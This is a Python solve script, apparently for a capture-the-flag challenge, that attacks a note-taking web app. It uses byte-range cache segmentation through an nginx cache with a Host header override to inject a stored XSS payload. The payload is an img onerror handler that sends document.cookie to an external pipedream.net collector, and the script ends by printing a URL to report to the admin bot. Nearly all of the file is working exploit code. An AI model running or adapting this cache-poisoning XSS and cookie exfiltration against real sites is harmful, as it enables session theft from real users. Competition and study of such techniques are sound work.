import sys
import httpx
import math

# python solve.py gotion.acsc....
# Set second arg on local environment
# python solve.py localhost:30080 nginx

PAYLOAD = 'img src=x onerror=location=`//eo7x31ojradre3r.m.pipedream.net/?c=${document.cookie}` x='
# payload length should be odd
if len(PAYLOAD) % 2 == 0:
  PAYLOAD = PAYLOAD + 'X'

TITLE = 'A' * 17 + 'mp4'
PADDING1_LENGTH = 969
PADDING2_LENGTH = PADDING1_LENGTH + 11
PADDING1 = 'A' * PADDING1_LENGTH
PADDING2 = 'B' * (PADDING2_LENGTH - int(len(PAYLOAD)/2))

def create_note(host):
  url = 'http://{}/new-note'.format(host)
  data = {
    'title': TITLE,
    'body': PADDING1
  }
  res = httpx.post(url, data=data)
  note_path = res.headers.get('Location')
  return note_path

# cache 0-4095
# response: ...AAAAA<
def segment_cache(host, cache_host, note_path):
  url = 'http://{}{}'.format(host, note_path)
  res = httpx.get(url, headers={
    'Range': 'bytes=0-4095',
    'Host': cache_host
  })
  #print(res.text)

def update_note(host, note_path):
  note_id = note_path.split('/')[2]
  url = 'http://{}/update-note'.format(host)
  data = {
    'noteId': note_id,
    'title': TITLE,
    'body': PADDING2 + PAYLOAD
  }
  httpx.post(url, data=data)

# response: ...<img src=x ...
def check_note(host, cache_host, note_path):
  url = 'http://{}{}'.format(host, note_path)
  res = httpx.get(url, headers={
    'Host': cache_host
  })
  #print(res.text)

host = sys.argv[1]
cache_host = sys.argv[2] if len(sys.argv) > 2 else host

note_path = create_note(host)
segment_cache(host, cache_host, note_path)
update_note(host, note_path)
check_note(host, cache_host, note_path)

print('Report this URL: http://{}{}'.format(host, note_path))